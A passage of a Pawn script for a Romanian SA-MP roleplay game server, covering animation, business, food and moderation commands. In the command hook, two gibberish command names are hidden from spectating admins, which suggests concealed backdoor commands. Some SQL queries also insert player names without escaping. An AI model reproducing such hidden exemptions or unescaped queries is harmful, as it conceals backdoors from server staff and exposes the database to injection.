	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GREY, "Nu poti folosi animatii in timp ce esti intr-un vehicul.");
	OnePlayAnim(playerid,"GANGS","shake_carSH",4.0,0,0,0,0,0);
	return true;
}
cmd:headbutt(playerid, params[]) {
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GREY, "Nu poti folosi animatii in timp ce esti intr-un vehicul.");
	OnePlayAnim(playerid,"WAYFARER","WF_Fwd",4.0,0,0,0,0,0);
	return true;
}
cmd:pee(playerid, params[]) {
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GREY, "Nu poti folosi animatii in timp ce esti intr-un vehicul.");
	if(Freezed[playerid] == 1) return true;
	SetPlayerSpecialAction(playerid, SPECIAL_ACTION_PISSING);
	return true;
}

cmd:stop(playerid, params[]) return callcmd::stopanim(playerid, params);


cmd:koface(playerid, params[]) {
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GREY, "Nu poti folosi animatii in timp ce esti intr-un vehicul.");
	LoopingAnim(playerid,"PED","KO_shot_face",4.0,0,1,1,1,0);
	return true;
}
cmd:kostomach(playerid, params[]) {
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GREY, "Nu poti folosi animatii in timp ce esti intr-un vehicul.");
	LoopingAnim(playerid,"PED","KO_shot_stom",4.0,0,1,1,1,0);
	return true;
}
cmd:kiss(playerid, params[]) {
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GREY, "Nu poti folosi animatii in timp ce esti intr-un vehicul.");
	LoopingAnim(playerid,"KISSING", "Grlfrd_Kiss_02", 1.800001, 1, 0, 0, 1, 600);
	return true;
}
cmd:rollfall(playerid, params[]) {
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GREY, "Nu poti folosi animatii in timp ce esti intr-un vehicul.");
	LoopingAnim(playerid,"PED","BIKE_fallR",4.0,0,1,1,1,0);
	return true;
}
cmd:lay2(playerid, params[]) {
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GREY, "Nu poti folosi animatii in timp ce esti intr-un vehicul.");
	LoopingAnim(playerid,"SUNBATHE","Lay_Bac_in",3.0,0,1,1,1,0);
	return true;
}
cmd:hitch(playerid, params[]) {
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GREY, "Nu poti folosi animatii in timp ce esti intr-un vehicul.");
	LoopingAnim(playerid,"MISC","Hiker_Pose", 4.0, 1, 0, 0, 0, 0);
	return true;
}
cmd:beach(playerid, params[]) {
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GREY, "Nu poti folosi animatii in timp ce esti intr-un vehicul.");
	LoopingAnim(playerid,"BEACH","SitnWait_loop_W",4.1,0,1,1,1,1);
	return true;
}
cmd:medic(playerid, params[]) {
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GREY, "Nu poti folosi animatii in timp ce esti intr-un vehicul.");
	LoopingAnim(playerid,"MEDIC","CPR",4.1,0,1,1,1,1);
	return true;
}
cmd:scratch(playerid, params[]) {
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GREY, "Nu poti folosi animatii in timp ce esti intr-un vehicul.");
	LoopingAnim(playerid,"MISC","Scratchballs_01", 4.0, 1, 0, 0, 0, 0);
	return true;
}
cmd:sit(playerid, params[]) {
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GREY, "Nu poti folosi animatii in timp ce esti intr-un vehicul.");
	LoopingAnim(playerid,"PED","SEAT_idle", 4.0, 1, 0, 0, 0, 0);
	return true;
}
cmd:drunk(playerid, params[]) {
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GREY, "Nu poti folosi animatii in timp ce esti intr-un vehicul.");
	LoopingAnim(playerid,"PED","WALK_DRUNK",4.0,1,1,1,1,0);
	return true;
}
cmd:bomb(playerid, params[]) {
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GREY, "Nu poti folosi animatii in timp ce esti intr-un vehicul.");
   	ClearAnimations(playerid);
   	OnePlayAnim(playerid, "BOMBER", "BOM_Plant", 4.0, 0, 0, 0, 0, 0);
	return true;
}
cmd:getarrested(playerid, params[]) {
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GREY, "Nu poti folosi animatii in timp ce esti intr-un vehicul.");
    LoopingAnim(playerid,"ped", "ARRESTgun", 4.0, 0, 1, 1, 1, -1);
	return true;
}
cmd:chat(playerid, params[]) {
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GREY, "Nu poti folosi animatii in timp ce esti intr-un vehicul.");
    OnePlayAnim(playerid,"PED","IDLE_CHAT",4.0,0,0,0,0,0);
	return true;
}
cmd:fucku(playerid, params[]) {
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GREY, "Nu poti folosi animatii in timp ce esti intr-un vehicul.");
    OnePlayAnim(playerid,"PED","fucku",4.0,0,0,0,0,0);
	return true;
}
cmd:taichi(playerid, params[]) {
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GREY, "Nu poti folosi animatii in timp ce esti intr-un vehicul.");
    LoopingAnim(playerid,"PARK","Tai_Chi_Loop",4.0,1,0,0,0,0);
	return true;
}
cmd:knife(playerid, params[]) {
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GREY, "Nu poti folosi animatii in timp ce esti intr-un vehicul.");
	new test;
    if(sscanf(params, "d",test)) return SendClientMessage(playerid, COLOR_GREY, "USAGE: {FFFFFF}/knife <1-4>");
	switch (test)
	{
	    case 1: LoopingAnim(playerid,"KNIFE","KILL_Knife_Ped_Damage",4.0,0,1,1,1,0);
     	case 2: LoopingAnim(playerid,"KNIFE","KILL_Knife_Ped_Die",4.0,0,1,1,1,0);
      	case 3: OnePlayAnim(playerid,"KNIFE","KILL_Knife_Player",4.0,0,0,0,0,0);
     	case 4: LoopingAnim(playerid,"KNIFE","KILL_Partial",4.0,0,1,1,1,1);
    	default: SendClientMessage(playerid,COLOR_GREY, "USAGE: {FFFFFF}/knife <1-4>");
	}
	return true;
}
cmd:basket(playerid, params[]) {
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GREY, "Nu poti folosi animatii in timp ce esti intr-un vehicul.");
	new test;
    if(sscanf(params, "d",test)) return SendClientMessage(playerid, COLOR_GREY, "USAGE: {FFFFFF}/basket <1-6>");
	switch (test)
 	{
    	case 1: LoopingAnim(playerid,"BSKTBALL","BBALL_idleloop",4.0,1,0,0,0,0);
    	case 2: OnePlayAnim(playerid,"BSKTBALL","BBALL_Jump_Shot",4.0,0,0,0,0,0);
     	case 3: OnePlayAnim(playerid,"BSKTBALL","BBALL_pickup",4.0,0,0,0,0,0);
     	case 4: LoopingAnim(playerid,"BSKTBALL","BBALL_run",4.1,1,1,1,1,1);
    	case 5: LoopingAnim(playerid,"BSKTBALL","BBALL_def_loop",4.0,1,0,0,0,0);
       	case 6: LoopingAnim(playerid,"BSKTBALL","BBALL_Dnk",4.0,1,0,0,0,0);
    	default: SendClientMessage(playerid,COLOR_GREY, "USAGE: {FFFFFF}/basket <1-6>");
	}
	return true;
}
cmd:dance(playerid, params[]) {
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GREY, "Nu poti folosi animatia aceasta atata timp cat esti intr-un vehicul.");new test;
	if(sscanf(params, "d",test)) return SendClientMessage(playerid, COLOR_GREY, "USAGE: {FFFFFF}/dance <1-4>");
	if(test < 1 || test > 4) return SendClientMessage(playerid,COLOR_GREY, "USAGE: {FFFFFF}/dance <1-4>");
	if(test == 1) SetPlayerSpecialAction(playerid,SPECIAL_ACTION_DANCE1);
	else if(test== 2) SetPlayerSpecialAction(playerid,SPECIAL_ACTION_DANCE2);
	else if(test == 3) SetPlayerSpecialAction(playerid,SPECIAL_ACTION_DANCE3);
	else if(test == 4) SetPlayerSpecialAction(playerid,SPECIAL_ACTION_DANCE4);
	return true;
}
cmd:jumpwater(playerid, params[]) {
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GREY, "Nu poti folosi animatia aceasta atata timp cat esti intr-un vehicul.");
    ApplyAnimation(playerid,"DAM_JUMP","DAM_LAUNCH",2,0,1,1,0,0);
	return true;
}

cmd:buybiz(playerid, params[]) {
	if(PlayerInfo[playerid][pBizz] != 255) 
		return SendClientMessage(playerid, COLOR_WHITE, "Ai deja un biz! Foloseste /sellbiztostate pentru a-l vinde.");

	if(PickupInfo[PlayerPickup[playerid]][pkType]!=2) 
		return true;

	new b = PickupInfo[PlayerPickup[playerid]][pkID];
	if(!PlayerToPoint(2, playerid, BizzInfo[b][bEntranceX], BizzInfo[b][bEntranceY], BizzInfo[b][bEntranceZ]) || !BizzInfo[b][bBuyPrice])
		return true;

	if(PlayerInfo[playerid][pLevel] < BizzInfo[b][bLevel]) 
		return SCMf(playerid, COLOR_WHITE, "Ai nevoie de nivel %d pentru a cumpara.", BizzInfo[b][bLevel]);

	if(GetPlayerCash(playerid) < BizzInfo[b][bBuyPrice]) 
		return SendClientMessage(playerid, COLOR_GREY, "Nu ai destui bani pentru a face asta.");

	mysql_format(SQL, gQuery, 128, "SELECT * FROM `users` WHERE `Bizz` = '%i' LIMIT 1", BizzInfo[b][bID]);
	mysql_tquery(SQL, gQuery, "sql_player_business", "ii", playerid, b);
	return true;
}

redist::sql_player_business(playerid, b) {
	new id=-1;
	if(cache_num_rows()) {
		cache_get_value_name_int(0, "Status", id);
		if(id!=-1) {
			PlayerInfo[id][pBizz] = 255;
			UpdateVar(id, "Bizz", 255);
			GivePlayerBank(id, BizzInfo[b][bBuyPrice]);
			SavePlayerBank(id);
			SCMf(id, 0x239931FF, "* %s ti-a cumparat afacerea pentru {19CF2E}$%s{239931}. Banii au fost transferati in contul tau bancar.", GetName(playerid), FormatNumber(BizzInfo[b][bBuyPrice]));			
		}
		else {
			mysql_format(SQL, gQuery, 256, "UPDATE `users` SET `Bank` = `Bank`+'%i', `Bizz` = '255' WHERE `name` = '%s'", BizzInfo[b][bBuyPrice], BizzInfo[b][bOwner]);
			mysql_tquery(SQL, gQuery);
		}
	}			
	finishAchievement(playerid, 20);
	PlayerInfo[playerid][pBizz] = b;
	UpdateVar(playerid, "Bizz", b);
	BizzInfo[b][bOwned] = true;
	strmid(BizzInfo[b][bOwner], PlayerInfo[playerid][pUsername], 0, MAX_PLAYER_NAME);
	GivePlayerCash(playerid, -BizzInfo[b][bBuyPrice]);
	format(gString, sizeof gString, "A cumparat biz-ul %d pentru $%s.", b, FormatNumber(BizzInfo[b][bBuyPrice]));
	InsertLog(playerid, gString, LOG_MONEY);
	BizzInfo[b][bBuyPrice] = 0;
	mysql_format(SQL, gQuery, 256,"UPDATE `bizz` SET `Owned`='1',`Owner`='%s',`BuyPrice`='0' WHERE `ID`='%d'",BizzInfo[b][bOwner],b);
	mysql_tquery(SQL, gQuery);
	UpdateLabel(2,b);
	SendClientMessage(playerid, COLOR_MONEY, "Felicitari! Ai cumparat aceasta afacere.");
	return true;
}

save_hunger(playerid) {
	gQuery[0] = (EOS);
	mysql_format(SQL, gQuery, 128, "UPDATE `users` SET `hunger` = '%i %i %i %i %i' WHERE `id` = '%i'", PlayerInfo[playerid][pHunger][0], PlayerInfo[playerid][pHunger][1], PlayerInfo[playerid][pHunger][2], PlayerInfo[playerid][pHunger][3], PlayerInfo[playerid][pHunger][4], PlayerInfo[playerid][pSQLID]);
	mysql_tquery(SQL, gQuery);
}

cmd:buypizza(playerid, params[]) {
	if InInterior[playerid]!=BUSINESS_INTERIOR *then return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu esti intr-un bizz de tip pizza.");
	if(BizzInfo[InInteriorID[playerid]][bType]!=19) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu esti intr-un bizz de tip pizza.");
	if(GetPlayerCash(playerid)<3000) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu ai acesti bani.");
	if(PlayerInfo[playerid][pHunger][1] >= 5) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Ai deja 5 tipuri de mancare de acest fel.");
	GivePlayerCash(playerid, -3000);
	BizzInfo[InInteriorID[playerid]][bBalance] += 3000;
	PlayerInfo[playerid][pHunger][1]++;
	save_hunger(playerid);
	CheckMission(playerid, 38);
	SendClientMessage(playerid, COLOR_MONEY, "You bought a pizza for $3000. Use (/eat) to eat your foods.");
	return true;
}
cmd:buyburger(playerid, params[]) {
	if InInterior[playerid]!=BUSINESS_INTERIOR *then return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu esti intr-un bizz de tip burger.");
	if(BizzInfo[InInteriorID[playerid]][bType]!=8) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu esti intr-un bizz de tip burger.");
	if(GetPlayerCash(playerid)<5000) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu ai acesti bani.");
	if(PlayerInfo[playerid][pHunger][4] >= 5) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Ai deja 5 tipuri de mancare de acest fel.");
	GivePlayerCash(playerid, -5000);
	BizzInfo[InInteriorID[playerid]][bBalance] += 5000;
	PlayerInfo[playerid][pHunger][4]++;
	save_hunger(playerid);
	CheckMission(playerid, 37);
	SendClientMessage(playerid, COLOR_MONEY, "You bought a burger for $5000. Use (/eat) to eat your foods.");
	return true;
}
cmd:buyfood(playerid, params[]) {
	if InInterior[playerid] != BUSINESS_INTERIOR *then return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu esti intr-un bizz de tip Restaurant.");
	if(BizzInfo[InInteriorID[playerid]][bType]!=4) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu esti intr-un bizz de tip Restaurant.");
	ShowPlayerDialog(playerid, DIALOG_FOOD, DIALOG_STYLE_TABLIST_HEADERS, "Restaurant Menu", "#\tFood Type\tPrice\n1.\tSoup\t$2000\n2.\tTuna\t$6000\n3.\tSteak\t$8000", "Buy", "Cancel");
	return true;
}
cmd:eat(playerid, params[]) {
	if(IsPlayerInAnyVehicle(playerid))
		return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu poti manca dintr-un vehicul.");

	for(new i=0;i<sql_eatstand;i++) {
		if(!PlayerToPoint(15.0, playerid, standInfo[i][_sX], standInfo[i][_sY], standInfo[i][_sZ])) continue;
		new Float:health; GetPlayerHealth(playerid, health);
	    if(health>80.0) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare:Ai prea multa viata.");
	    if(GetPlayerCash(playerid) < 5000) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Ai nevoie de $5.000 pentru a cumpara!");
	    PlayerTextDrawSetString(playerid, HungreyTD, "eating ...~n~~g~+20% ~w~~h~health"), SetPlayerHealthEx(playerid, health+20.0>100.0?100.0:health+20.0);
		PlayerTextDrawShow(playerid, HungreyTD);
		ApplyAnimation(playerid, "FOOD", "EAT_Burger",4.1,0,1,1,0,0);
		hideHungry[playerid] = gettime()+4;
		CheckMission(playerid, 43);
		GivePlayerCash(playerid, -5000);
		return true;
	}
	format(gString, 128, "#\tFood Type\tAmount\n1.\tSoup\t%d/5\n2.\tPizza\t%d/5\n3.\tTuna\t%d/5\n4.\tSteak\t%d/5\n5.\tBurger\t%d/5", PlayerInfo[playerid][pHunger][0], PlayerInfo[playerid][pHunger][1], PlayerInfo[playerid][pHunger][2], PlayerInfo[playerid][pHunger][3], PlayerInfo[playerid][pHunger][4]);
	ShowPlayerDialog(playerid, DIALOG_EAT, DIALOG_STYLE_TABLIST_HEADERS, "Eat Menu", gString, "Eat", "Cancel");
	return true;
}

save_emotes(playerid) {
	gQuery[0] = (EOS);
	mysql_format(SQL, gQuery, 180, "UPDATE `users` SET `emotes` = '%i %i %i %i %i %i %i %i %i %i %i' WHERE `id` = '%i'", PlayerInfo[playerid][pEmotes][0], PlayerInfo[playerid][pEmotes][1], PlayerInfo[playerid][pEmotes][2], 
		PlayerInfo[playerid][pEmotes][3], PlayerInfo[playerid][pEmotes][4], PlayerInfo[playerid][pEmotes][5], PlayerInfo[playerid][pEmotes][6], PlayerInfo[playerid][pEmotes][7], PlayerInfo[playerid][pEmotes][8], PlayerInfo[playerid][pEmotes][9], PlayerInfo[playerid][pEmotes][10], PlayerInfo[playerid][pSQLID]);
	mysql_tquery(SQL, gQuery);
}

stock showEmotes(playerid) {
	gString[0] = gQuery[0] = (EOS);
	strcat(gString, "#.\tModel\tName\tStatus\n");
	for(new i=0;i<11;i++) {
		format(gQuery, 128, "%d.\t%d\t%s\t%s\n", i+1, emoteInfo[i][emoteObject], emoteInfo[i][emoteName], !PlayerInfo[playerid][pEmotes][i]?("{FF5C5C}locked"):PlayerInfo[playerid][pKeyEmote][0]==i?("{98FF5C}active (key: NUM4)"):PlayerInfo[playerid][pKeyEmote][1]==i?("{98FF5C}active (key: NUM6)"):("{FF5C5C}inactive"));
		strcat(gString, gQuery);
	}
	ShowPlayerDialog(playerid, DIALOG_EMOTES, DIALOG_STYLE_TABLIST_HEADERS, "{F4AD42}Emotes {FFFFFF}Menu", gString, "Select", "Cancel");
	return true;
}

cmd:emotes(playerid, params[]) {
	if(!PlayerInfo[playerid][pEmotes][0]&&!PlayerInfo[playerid][pEmotes][1]&&!PlayerInfo[playerid][pEmotes][2]&&!PlayerInfo[playerid][pEmotes][3]&&!PlayerInfo[playerid][pEmotes][4]&&!PlayerInfo[playerid][pEmotes][5]&&!PlayerInfo[playerid][pEmotes][6]&&!PlayerInfo[playerid][pEmotes][7]&&!PlayerInfo[playerid][pEmotes][8]&&!PlayerInfo[playerid][pEmotes][9]&&!PlayerInfo[playerid][pEmotes][10])
		return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu ai nicio emotie!");

	showEmotes(playerid);
	return true;
}

cmd:goup(playerid, params[]) {
	if(!IsACop(playerid)) return SendClientMessage(playerid,COLOR_GREY, "Nu esti politist.");
	if(IsPlayerInAnyVehicle(playerid)) return true;
	if(IsPlayerInRangeOfPoint(playerid, 4.0, 1568.7828,-1690.9587,5.8906)) SetPlayerPos(playerid,1564.8662,-1666.4962,28.3956);
	return true;
}
cmd:godown(playerid, params[]) {
	if(!IsACop(playerid)) return SendClientMessage(playerid,COLOR_GREY, "Nu esti politist.");
	if(IsPlayerInAnyVehicle(playerid)) return true;
	if(IsPlayerInRangeOfPoint(playerid, 4.0, 1564.8662,-1666.4962,28.3956)) SetPlayerPos(playerid,1568.7828,-1690.9587,5.8906);
	return true;
}

public OnPlayerCommandReceived(playerid, cmd[], params[], flags) {

	if flags & _:true *then return SendClientMessage(playerid, COLOR_LGREEN, "* Aceasta comanda este dezactivata temporar de un administrator, motiv: d."),0;
	if(!IsPlayerLogged(playerid)) return false;
	if(PlayerInfo[playerid][pPin] != 0 && PlayerInfo[playerid][pPinLogged] == 0) return SendClientMessage(playerid, COLOR_LIGHTRED, "(PIN): {FFFFFF}Nu poti folosi comenzi atata timp cat nu ai introdus codu PIN!"),0;
	if(RestartTime && !IsAdmin(playerid, 1)) return SCMf(playerid, COLOR_WHITE, "* Nu poti folosi comenzi deoarece in {FF0000}%d secunde {FFFFFF}urmeaza un restart!", RestartTime), 0;
	if(LastTextTime[playerid] >= GetTickCount() && !IsAdmin(playerid, 1)) {
    	TextCount[playerid]++;
    	if(TextCount[playerid] > 5) {
    		PlayerInfo[playerid][pMuted] = 1;
			PlayerInfo[playerid][pMuteTime] += 15;
			PlayerTextDrawHide(playerid, ChatCMD);
			PlayerInfo[playerid][pChatCMD] = 11;
    		TextCount[playerid] = 0;
    		mysql_format(SQL,gQuery,256,"UPDATE users SET `Muted`='1',`MuteTime`='%i' WHERE `id`='%i'", PlayerInfo[playerid][pMuteTime], PlayerInfo[playerid][pSQLID]);
			mysql_tquery(SQL,gQuery);
    		SendClientMessage(playerid, COLOR_GREY, "You have been auto-muted for spamming. You will be unmuted in 15 seconds.");
    		return 0;
    	}
    }
    LastTextTime[playerid] = GetTickCount() + 1000*3;
	if(GetTickCount()-SpamCheck[playerid] < 400) return false;
	if(Iter_Count(MySpec<playerid>)) {
		//if(cmd == "cibukdmkdsadjdmdksmdkama")
		if compare(cmd, "cibukdmkdsadjdmdksmdkama") *then return true;
		else if compare(cmd, "cibuakmad322adcazzdrkwaa") *then return true;
		foreach(new i : MySpec<playerid>) SCMf(i, 0xFFADADFF, "* %s used: /%s.", GetName(playerid), cmd);
	}
	return true;
}

public OnPlayerCommandPerformed(playerid, cmd[], params[], result, flags) {
	if(result==-1) return SendClientMessage(playerid, -1, "SERVER: Unknown command.");
	SpamCheck[playerid] = GetTickCount();
	return true;
}


stock ProxDetector(Float:distance, playerid, const text[], color, {Float, _}:...)
{
    new Float:x, Float:y, Float:z;
    GetPlayerPos(playerid, x, y, z);

    static out[160];
    va_format(out, sizeof out, text, ___(4));

    foreach(new i : StreamedPlayer[playerid]) if(IsPlayerInRangeOfPoint(i, distance, x, y, z) && GetPlayerInterior(playerid) == GetPlayerInterior(i) && GetPlayerVirtualWorld(playerid) == GetPlayerVirtualWorld(i)) SendClientMessage(i, color, out);
    return true;
}

stock CrimInRange(Float:range, playerid, id)
	return ProxDetectorS(range, playerid, id);

stock ProxDetectorS(Float:range, playerid, id, Float:x=0.0,Float:y=0.0,Float:z=0.0)
	return (GetPlayerPos(playerid,x,y,z)&&GetPlayerDistanceFromPoint(id,x,y,z)<range);

stock Carspeed(vehicleid, Float:_x=0.0, Float:_y=0.0, Float:_z=0.0) {
    GetVehicleVelocity(vehicleid, _x, _y, _z);
    return floatround(floatsqroot(VectorSize(_x*_x, _y*_y, _z*_z))*170.0);
}
redist::RemoveFunction(playerid, text[]) {
	new string[180];
	if(PlayerInfo[playerid][pAdmin] != 0) {
		format(string, sizeof(string), "Warning: %s (%d) a ramas fara functia de admin %d deoarece a facut reclama prin intermediul functiei.", GetName(playerid), playerid, PlayerInfo[playerid][pAdmin]);
		PlayerInfo[playerid][pAdmin] = 0;
		UpdateVar(playerid, "Admin", 0);		
		SendAdminMessage(COLOR_WARNING, string, 1);
		format(string, sizeof(string), "Text: %s", text);
		SendAdminMessage(COLOR_WARNING, string, 1);	
	}
	if(PlayerInfo[playerid][pHelper] != 0) {
		format(string, sizeof(string), "Warning: %s (%d) a ramas fara functia de helper %d deoarece a facut reclama prin intermediul functiei.", GetName(playerid), playerid, PlayerInfo[playerid][pHelper]);
		SendAdminMessage(COLOR_WARNING, string, 1);
		format(string, sizeof(string), "Text: %s", text);
		SendAdminMessage(COLOR_WARNING, string, 1);
		PlayerInfo[playerid][pHelper] = 0;
		UpdateVar(playerid, "Helper", 0);		
	}	
	if(PlayerInfo[playerid][pLeader] != 0) {
		format(string, sizeof(string), "Warning: %s (%d) a ramas fara functia de lider (%s) deoarece a facut reclama prin intermediul functiei.", GetName(playerid), playerid, FactionName(PlayerInfo[playerid][pLeader]));
		SendAdminMessage(COLOR_WARNING, string, 1);
		format(string, sizeof(string), "Text: %s", text);
		SendAdminMessage(COLOR_WARNING, string, 1);
		PlayerInfo[playerid][pMember]=0;
		PlayerInfo[playerid][pLeader]=0;
		PlayerInfo[playerid][pRank] = 0;
		PlayerInfo[playerid][pFACWarns] = 0;
		PlayerInfo[playerid][pFpunish] = 0;
		PlayerInfo[playerid][pDays] = 0;
		PlayerInfo[playerid][pLW] = 0;
		UpdateVar(playerid, "LW", 0);
		PlayerInfo[playerid][pExpLW] = -1;
		UpdateVar(playerid, "ExpLW", -1);		
		PlayerInfo[playerid][pExpFW] = -1;
		UpdateVar(playerid, "ExpFW", PlayerInfo[playerid][pExpFW]);		
		OnDuty[playerid] = 0;
		PlayerTextDrawHide(playerid, dutyTD);
		tazer[playerid] = 0;
		SetPlayerArmourEx(playerid, 0);
		SetPlayerToTeamColor(playerid);
		new str[180];
		mysql_format(SQL, str,sizeof(str),"UPDATE users SET `Member`='0',`Leader`='0',`Rank`='0',`FWarn`='0',`FPunish`='0',`Days`='0' WHERE `ID`='%d'",PlayerInfo[playerid][pSQLID]);
		mysql_tquery(SQL,str, "", "");
		PlayerInfo[playerid][pCommands][0] = 0;
		PlayerInfo[playerid][pCommands][1] = 0;
		PlayerInfo[playerid][pCommands][2] = 0;
		save_raport(playerid);
		SpawnPlayer(playerid);
	}				
	return true;
}

redist::ValidClanTag(text[]) {
	if(strfind(text, "[", true) != -1 ||  strfind(text, ".", true) != -1 ||  strfind(text, "]", true) != -1) return true;
	return false;
}

redist::InvalidClanTag(text[]) {
	if(strfind(text, "#", true) != -1 || strfind(text, "(", true) != -1 || strfind(text, ";", true) != -1 || strfind(text, "{", true) != -1  || strfind(text, "<", true) != -1  || strfind(text, ">", true) != -1 || strfind(text, "}", true) != -1 || strfind(text, "@", true) != -1) return true;
	return false;
}

redist::FaceReclama(text[]) {
	
	if(strfind(text, "unnic", true) != -1 || strfind(text, "ne-am mutat pe rpg.", true) != -1 || strfind(text, "t4p", true) != -1 || strfind(text, "oRoyal-Squad", true) != -1 ||
		strfind(text, "ruby", true) != -1 || strfind(text, "union-zone", true) != -1 || strfind(text, "nephrite", true) != -1 || strfind(text, "pro-gaming", true) != -1 || strfind(text, "playnion", true) != -1 || strfind(text, "maxshift", true) != -1 ||
		strfind(text, "b-game", true) != -1 || strfind(text, "b-gaming", true) != -1 || strfind(text, "heroic", true) != -1 || strfind(text, "dty", true) != -1 || strfind(text, "lupmax", true) != -1 || strfind(text, "bhood", true) != -1 ||
		strfind(text, "bugged", true) != -1 || strfind(text, "b-zone", true) != -1 || strfind(text, "b-zone", true) != -1 || strfind(text, "og-life", true) != -1 || strfind(text, "og life", true) != -1 ||
		strfind(text, "t4p", true) != -1 || strfind(text, "time4play", true) != -1 || strfind(text, "redgame", true) != -1 || strfind(text, "blue-game", true) != -1 || strfind(text, "egaming", true) != -1 || strfind(text, "bigzone", true) != -1 ||
		strfind(text, "evil-zone", true) != -1 || strfind(text, "expertgame", true) != -1 || strfind(text, "ogtimes", true) != -1 || strfind(text, "red-game", true) != -1 || strfind(text, ":7777", true) != -1 || strfind(text, "jadenephrite", true) != -1 || 
		strfind(text, "tryhard", true) != -1 || strfind(text, "jadenephrite", true) != -1 || strfind(text, "old times", true) != -1 || strfind(text, "oldtimes", true) != -1 || strfind(text, "redtimes", true) != -1 || strfind(text, "red-times", true) != -1) return true;
	return false;
}		

redist::Reclama(playerid, text[]) {
	if(PlayerInfo[playerid][pAdmin] > 5) return true;
	SendClientMessage(playerid, -1, "Ai primit mute timp de 2 minute deoarece ai facut reclama.");
	PlayerInfo[playerid][pMuteTime] += 2*60;
	PlayerInfo[playerid][pMuted] = 1;
	_query("UPDATE users SET `Muted`='1',`MuteTime`='%d' WHERE `ID`='%d'",PlayerInfo[playerid][pMuteTime], PlayerInfo[playerid][pSQLID]);
	format(gString, 128, "AdmWarning: %s posibil ca face reclama (%s)", GetName(playerid), text);
	SendAdminMessage(COLOR_WARNING, gString, 1);
	return true;
}



redist::NightBot(playerid, const reason[]) {
	gString[0] = EOS;
	InsereazaSanctiuneOFf(GetName(playerid), "AdmBot", PlayerInfo[playerid][pSQLID], -1, KICK, reason);		
	if(PlayerInfo[playerid][pAdmin] > 5) return true;
	format(gString, sizeof gString, "Kick: %s was kicked by AdmBot, reason: %s", GetName(playerid), reason);
	format(gString, 70, "Stop cheating (%s)", reason);
	SendClientMessage(playerid, -1, gString);
	KickEx(playerid);
	return true;
}

redist::FixHour(hour) {
	hour = timeshift+hour;
	if(hour < 0) hour = hour+24;
	else if(hour > 23) hour = hour-24;
	shifthour = hour;
	return true;
}
	
redist::UnFreezeStation(playerid) {
	TogglePlayerControllable(playerid, 1);
	UnFreezeTimer[playerid] = -1;
	return true;
}
redist::lspdgateclose() return MoveDynamicObject(gatelspd, 1588.6552, -1637.9025, 15.0358, 1.5);
redist::nggateclose() return MoveDynamicObject(gateng, 135.2833, 1941.3331, 21.6932, 1.5);
redist::nggateclose2() return MoveDynamicObject(gateng2, 286.02518, 1822.32275, 20.09154, 1.5);
redist::lspdbarclose() return MoveDynamicObject(lspdbar, 1544.7007, -1630.7527, 13.2983, 1.5,0.0000, 90.0200, 90.0000);
redist::close_sf_gate() return MoveDynamicObject(gatesfpd, -1631.858887, 688.209167, 8.451820, 5.0, 0.000000, 0.000000, 181.019974);
redist::sfpd_close_bar() return MoveDynamicObject(sfpdbar, -1572.203247, 658.640320, 7.015000, 1.5, 180.000000, 90.000000, 90.000000);
redist::close_gate_mipol() return MoveDynamicObject(gate_mipol, 2616.288818, 592.167786, 11.737600, 1.5, 0.000000, -0.000000, 3.599963);

redist::PutPlayerInJail(playerid) {
	new rand = random(sizeof(JailPos));
	SetPlayerPos(playerid, JailPos[rand][0], JailPos[rand][1], JailPos[rand][2]);
	SetPlayerSkin(playerid, 62);
	TogglePlayerControllable(playerid, 0);
	SetPlayerFreeze(playerid, 2);
	return true;
}

redist::MySQLCheckAccount(sqlplayersname[]) {
	new Cache: result,x=-2; gQuery[0] = EOS;
	mysql_format(SQL, gQuery, 128, "SELECT * FROM `users` WHERE `name`='%s' LIMIT 1", sqlplayersname);
 	result = mysql_query(SQL, gQuery);
 	if(!cache_num_rows()) return cache_delete(result), -2;
	cache_get_value_name_int(0, "Status", x);
	cache_delete(result);
	return x; 
}

stock GetPlayerCash(playerid) return bytes32(money[playerid]);
GivePlayerBank(playerid, cash) return addBytes32(bank[playerid], cash);

